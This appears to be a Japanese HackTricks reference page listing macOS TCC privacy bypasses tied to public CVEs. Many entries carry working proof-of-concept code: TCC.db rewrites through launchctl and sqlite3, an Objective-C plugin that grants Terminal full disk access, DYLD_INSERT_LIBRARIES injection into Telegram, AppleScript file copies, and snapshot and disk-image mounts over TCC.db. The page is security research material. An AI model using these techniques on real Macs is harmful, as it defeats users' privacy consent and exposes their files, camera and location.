# macOS TCC バイパス

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい場合** は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) をフォローする。
* **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## 機能別

### 書き込みバイパス

これはバイパスではなく、TCCの動作方法です: **書き込みからは保護されません**。ターミナルがユーザーのデスクトップを読み取る権限がない場合でも、**それに書き込むことができます**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
### SSH バイパス

デフォルトでは、**SSH 経由でのアクセスは「フルディスクアクセス」**を持っていました。これを無効にするには、リストに記載されている必要がありますが、無効にする必要があります（リストから削除してもこれらの権限は削除されません）：

![](<../../../../../.gitbook/assets/image (569).png>)

ここでは、いくつかの**マルウェアがこの保護をバイパス**する方法の例を見つけることができます：

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
SSH を有効にするには、**フルディスクアクセス**が必要です
{% endhint %}

### 拡張子の処理 - CVE-2022-26767

ファイルには、**特定のアプリケーションが読み取る権限を与える**ために、属性 **`com.apple.macl`** が付与されます。この属性は、ファイルをアプリに**ドラッグ＆ドロップ**するか、ユーザがファイルを**ダブルクリック**してデフォルトのアプリで開くときに設定されます。

したがって、ユーザは**悪意のあるアプリ**を登録して、すべての拡張子を処理し、Launch Services を呼び出して**任意のファイルを開く**ことができます（そのため、悪意のあるファイルは読み取りアクセスが許可されます）。

### iCloud

権限 **`com.apple.private.icloud-account-access`** を持つと、**`com.apple.iCloudHelper`** XPC サービスと通信でき、そこから **iCloud トークンを取得**できます。

**iMovie** と **Garageband** はこの権限を持っていました。

その権限から **iCloud トークンを取得**するエクスプロイトについての詳細は、次のトークを参照してください：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** 権限を持つアプリは、**他のアプリを制御**できます。つまり、他のアプリに付与された権限を**悪用**することができる可能性があります。

Apple スクリプトについての詳細は次を参照してください：

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

たとえば、アプリが **`iTerm` に対する Automation 権限**を持っている場合、この例では **`Terminal`** が iTerm にアクセス権を持っています：

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### iTerm 上で

FDA を持たない Terminal は、FDA を持つ iTerm を呼び出して、アクションを実行するために使用できます：

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Finderを介して

または、アプリがFinderを介してアクセスできる場合、次のようなスクリプトがあるかもしれません：
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## アプリケーションの動作による

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

ユーザーランドの **tccd デーモン** は、TCC ユーザーデータベースにアクセスするために **`HOME`** **env** 変数を使用しています: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[このStack Exchangeの投稿](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) によると、TCC デーモンは現在のユーザーのドメイン内で `launchd` を介して実行されているため、**それに渡されるすべての環境変数を制御**することが可能です。\
したがって、**攻撃者は** **`launchctl`** で **`$HOME` 環境** 変数を **制御されたディレクトリ** を指すように設定し、**TCC** デーモンを **再起動** してから、TCC データベースを **直接変更** して、エンドユーザーにプロンプトを表示せずに **利用可能なすべての TCC 権限を自分に与える**ことができます。\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - ノート

ノートはTCCで保護された場所へのアクセス権を持っていましたが、ノートが作成されるときは**保護されていない場所**に作成されます。そのため、ノートに保護されたファイルをコピーするように依頼し、その後ファイルにアクセスすることができました：

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - トランスロケーション

ライブラリ`libsecurity_translocate`を持つバイナリ`/usr/libexec/lsd`は、`com.apple.private.nullfs_allow`という権限を持っていました。これにより**nullfs**マウントを作成し、`com.apple.private.tcc.allow`と**`kTCCServiceSystemPolicyAllFiles`**を持っていたため、すべてのファイルにアクセスできました。

"Library"に隔離属性を追加し、**`com.apple.security.translocation`** XPCサービスを呼び出すことで、Libraryを**`$TMPDIR/AppTranslocation/d/d/Library`**にマッピングし、Library内のすべてのドキュメントに**アクセス**できるようになりました。

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`**には興味深い機能があります。実行中に**`~/Music/Music/Media.localized/Automatically Add to Music.localized`**にドロップされたファイルをユーザーの「メディアライブラリ」に**インポート**します。さらに、次のようなものを呼び出します：**`rename(a, b);`** ここで`a`と`b`は次のとおりです：

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

この**`rename(a, b);`**の動作は**競合状態**に脆弱であり、`Automatically Add to Music.localized`フォルダに偽の**TCC.db**ファイルを配置し、新しいフォルダ(b)が作成されたときにファイルをコピーして削除し、**`~/Library/Application Support/com.apple.TCC`**/にポイントを指定することが可能でした。

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

**`SQLITE_SQLLOG_DIR="path/folder"`**が設定されている場合、**任意のオープンされたdbがそのパスにコピー**されます。このCVEでは、この制御が悪用され、**TCCデータベースを持つプロセスによって開かれるSQLiteデータベース**内に**書き込む**ことが可能であり、その後**`SQLITE_SQLLOG_DIR`**を**ファイル名にシンボリックリンク**を使用して悪用し、そのデータベースが**開かれる**と、ユーザーの**TCC.dbが上書き**されました。\
**詳細は**[**こちらの解説**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **および**[**こちらのトーク**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s) **をご覧ください**。

### **SQLITE\_AUTO\_TRACE**

環境変数**`SQLITE_AUTO_TRACE`**が設定されている場合、ライブラリ**`libsqlite3.dylib`**はすべてのSQLクエリを**ログ記録**を開始します。多くのアプリケーションがこのライブラリを使用していたため、すべてのSQLiteクエリをログ記録することが可能でした。

いくつかのAppleアプリケーションは、TCCで保護された情報にアクセスするためにこのライブラリを使用していました。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

この**環境変数は、`Metal`フレームワーク**で使用されており、さまざまなプログラムに依存しています。特に`Music`にはFDAがあります。

次のように設定します：`MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`。`path`が有効なディレクトリである場合、バグがトリガーされ、プログラムで何が起こっているかを`fs_usage`で確認できます：

- `open()`されるファイルは、`path/.dat.nosyncXXXX.XXXXXX`（Xはランダム）と呼ばれます。
- 1つ以上の`write()`がファイルに内容を書き込みます（これは制御できません）。
- `path/.dat.nosyncXXXX.XXXXXX`が`rename()`されて`path/name`になります。

これは一時ファイルの書き込みであり、その後に**セキュリティが確保されていない** **`rename(old, new)`** が続きます。

これは**古いパスと新しいパスを別々に解決する必要がある**ため、時間がかかり、競合状態に対して脆弱になる可能性があります。詳細については、`xnu`関数`renameat_internal()`を確認してください。

{% hint style="danger" %}
つまり、特権プロセスがコントロールするフォルダから名前を変更する場合、RCEを獲得し、異なるファイルにアクセスしたり、このCVEのように特権アプリが作成したファイルを開いてFDを保存することができます。

名前変更がコントロールするフォルダにアクセスする場合、ソースファイルを変更したり、そのFDを持っている場合、宛先ファイル（またはフォルダ）をシンボリックリンクに指すように変更できるため、いつでも書き込むことができます。
{% endhint %}

このCVEでの攻撃は次のとおりです：例えば、ユーザーの`TCC.db`を上書きするには：

- `/Users/hacker/ourlink`を`/Users/hacker/Library/Application Support/com.apple.TCC/`を指すように作成します。
- ディレクトリ`/Users/hacker/tmp/`を作成します。
- `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`を設定します。
- この環境変数を使用して`Music`を実行してバグをトリガーします。
- `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX`（Xはランダム）の`open()`をキャッチします。
- ここでも、このファイルを書き込み用に`open()`し、ファイルディスクリプタを保持します。
- `/Users/hacker/tmp`を`/Users/hacker/ourlink`に**ループ内で**原子的に切り替えます。
- これは、競合ウィンドウが非常に狭いため、成功する可能性を最大化するために行いますが、競争に負けるとほとんどデメリットがあります。
- 少し待ちます。
- 運が良ければテストします。
- そうでない場合は、最初からやり直します。

詳細は[https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)で確認できます。

{% hint style="danger" %}
今、環境変数`MTL_DUMP_PIPELINES_TO_JSON_FILE`を使用しようとすると、アプリが起動しなくなります。
{% endhint %}

### Apple Remote Desktop

rootとしてこのサービスを有効にすると、**ARDエージェントはフルディスクアクセス**を持ち、ユーザーが新しい**TCCユーザーデータベースをコピー**することができます。

## **NFSHomeDirectory**による

TCCは、ユーザーのHOMEフォルダ内のデータベースを使用して、ユーザー固有のリソースへのアクセスを制御します。**$HOME/Library/Application Support/com.apple.TCC/TCC.db**にあります。\
したがって、ユーザーが$HOME環境変数を**異なるフォルダ**を指すように再起動できれば、ユーザーは**/Library/Application Support/com.apple.TCC/TCC.db**に新しいTCCデータベースを作成し、TCCを騙して任意のアプリにTCC権限を付与できます。

{% hint style="success" %}
Appleは、**`NFSHomeDirectory`**属性内にユーザープロファイルに格納された設定を使用して、**`$HOME`**の値を取得します。したがって、この値を変更する権限（**`kTCCServiceSystemPolicySysAdminFiles`**）を持つアプリケーションを侵害すると、このオプションをTCCバイパスとして**兵器化**できます。
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**最初のPOC**は、[**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)と[**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)を使用して、ユーザーのホームフォルダを変更します。

1. ターゲットアプリケーションの_csreq_ blobを取得します。
2. 必要なアクセス権と_csreq_ blobを持つ偽の_TCC.db_ファイルを配置します。
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)を使用してユーザーのDirectory Servicesエントリをエクスポートします。
4. ユーザーのホームディレクトリを変更するためにDirectory Servicesエントリを変更します。
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)を使用して変更されたDirectory Servicesエントリをインポートします。
6. ユーザーの_tccd_を停止し、プロセスを再起動します。

**2番目のPOC**は、`/usr/libexec/configd`を使用し、`com.apple.private.tcc.allow`という値が`kTCCServiceSystemPolicySysAdminFiles`であることがわかりました。\
攻撃者は、**`configd`**を**`-t`**オプションで実行することで、**カスタムバンドルをロード**できました。したがって、この脆弱性は、ユーザーのホームディレクトリを変更する**`configd`コードインジェクション**によって、ユーザーのホームディレクトリを変更する**`dsexport`**および**`dsimport`**の方法を置き換えることができました。

詳細については、[**元のレポート**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)を確認してください。

## プロセスインジェクションによる

プロセス内にコードをインジェクトしてTCC権限を悪用するさまざまな技術があります：

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

さらに、TCCをバイパスするための最も一般的なプロセスインジェクションは、**プラグイン（ライブラリの読み込み）**を介して行われます。\
プラグインは通常、ライブラリまたはplist形式の追加コードであり、**メインアプリケーションによって読み込まれ**、そのコンテキストで実行されます。したがって、メインアプリケーションがTCC制限ファイルにアクセス権（許可された権限または権限）を持っている場合、**カスタムコードもそれを持つ**ことになります。

### CVE-2020-27937 - Directory Utility

アプリケーション`/System/Library/CoreServices/Applications/Directory Utility.app`には、**`kTCCServiceSystemPolicySysAdminFiles`**という権限があり、**`.daplug`**拡張子のプラグインを読み込み、**ハード化されていなかった**ランタイムがありました。

このCVEを兵器化するために、**`NFSHomeDirectory`**が変更され（前述の権限を悪用）、TCCをバイパスするためにユーザーのTCCデータベースを**乗っ取る**ことができるようになりました。

詳細については、[**元のレポート**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)を確認してください。

### CVE-2020-29621 - Coreaudiod

バイナリ**`/usr/sbin/coreaudiod`**には、`com.apple.security.cs.disable-library-validation`と`com.apple.private.tcc.manager`という権限がありました。最初の**コードインジェクションを許可**し、2番目の権限は**TCCを管理する**権限を与えていました。

このバイナリは、`/Library/Audio/Plug-Ins/HAL`フォルダから**サードパーティプラグイン**を読み込むことができました。したがって、このPoCでは、**プラグインをロード**し、TCC権限を悪用することができました。
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
詳細については、[**元のレポート**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)をチェックしてください。

### デバイス抽象化レイヤー（DAL）プラグイン

Core Media I/Oを介してカメラストリームを開くシステムアプリケーション（**`kTCCServiceCamera`**を持つアプリ）は、`/Library/CoreMediaIO/Plug-Ins/DAL`にあるこれらのプラグインをプロセス内に読み込みます（SIP制限なし）。

そこに一般的な**コンストラクタ**を持つライブラリを保存するだけで、**コードを注入**することができます。

これに対していくつかのAppleアプリケーションが脆弱でした。

### Firefox

Firefoxアプリケーションには、`com.apple.security.cs.disable-library-validation`および`com.apple.security.cs.allow-dyld-environment-variables`の権限がありました。
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
### CVE-2020-10006

バイナリ `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` には **`com.apple.private.tcc.allow`** と **`com.apple.security.get-task-allow`** の権限があり、これによりプロセス内にコードを注入して TCC 権限を使用することができました。

### CVE-2023-26818 - Telegram

Telegram には **`com.apple.security.cs.allow-dyld-environment-variables`** と **`com.apple.security.cs.disable-library-validation`** の権限があり、これを悪用してカメラでの録画などの権限にアクセスすることが可能でした。[**writeup でペイロードを見つけることができます**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。

環境変数を使用してライブラリをロードする方法に注目し、**カスタム plist** を作成してこのライブラリを注入し、**`launchctl`** を使用して起動する方法について説明します。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## オープン呼び出しによるバイパス

サンドボックス化された状態でも**`open`**を呼び出すことが可能です

### ターミナルスクリプト

技術者が使用するコンピュータでは、ターミナルに**Full Disk Access (FDA)** を与えることが一般的です。そして、それを使用して**`.terminal`**スクリプトを呼び出すことが可能です。

**`.terminal`**スクリプトは、以下のような**`CommandString`**キーで実行するコマンドが含まれるplistファイルです：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
アプリケーションは、/tmpなどの場所にターミナルスクリプトを書き込み、次のようにコマンドを使用して起動する可能性があります：
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## マウントによる

### CVE-2020-9771 - mount\_apfs TCC バイパスと権限昇格

**どんなユーザー**（特権を持たないユーザーでも）がタイムマシンのスナップショットを作成し、マウントし、そのスナップショットの**すべてのファイルにアクセス**できます。\
**唯一の特権**は、使用されるアプリケーション（例：`Terminal`）が**Full Disk Access**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）を持っている必要があり、これは管理者によって許可される必要があります。

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

より詳しい説明は[**元のレポート**](https://theevilbit.github.io/posts/cve\_2020\_9771/)に**あります**。

### CVE-2021-1784 & CVE-2021-30808 - TCCファイルをマウントする

TCC DBファイルが保護されていても、新しいTCC.dbファイルを**ディレクトリにマウントする**ことが可能でした：
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
### asr

ツール**`/usr/sbin/asr`**は、TCC保護をバイパスしてディスク全体をコピーし、別の場所にマウントすることができました。

### 位置情報サービス

**`/var/db/locationd/clients.plist`**には、**位置情報サービスにアクセスを許可されたクライアントを示す**サードパーティのTCCデータベースがあります。\
フォルダ**`/var/db/locationd/`はDMGマウントから保護されていなかった**ため、独自のplistをマウントすることが可能でした。

## 起動アプリによる

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## grepによる

いくつかの場合、ファイルには電子メール、電話番号、メッセージなどの機密情報が非保護の場所に保存されています（これはAppleの脆弱性としてカウントされます）。

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## 合成クリック

これはもはや機能しませんが、[**過去には機能しました**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics イベント**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf)を使用した別の方法：

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## 参考

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
